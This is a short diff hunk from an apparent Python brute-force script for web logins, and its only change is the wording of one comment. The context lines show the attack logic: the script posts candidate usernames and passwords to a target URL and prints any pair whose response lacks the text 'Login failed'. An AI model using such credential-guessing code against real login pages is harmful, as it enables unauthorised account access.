@@ -37,7 +37,7 @@ for name in userlist:
             "Login":"Login"
             }
 
-            req=requests.post (input , data = credentials) #creating post requests to send the target
+            req=requests.post (input , data = credentials) #creating post requests for sending it to the target
 
             if req.text.find("Login failed") == -1: #If in the reply message "Login failed" is not present , those are the correct credentials
                 print(f"[+] Correct username is {name} and Correct Password is {passwd}")
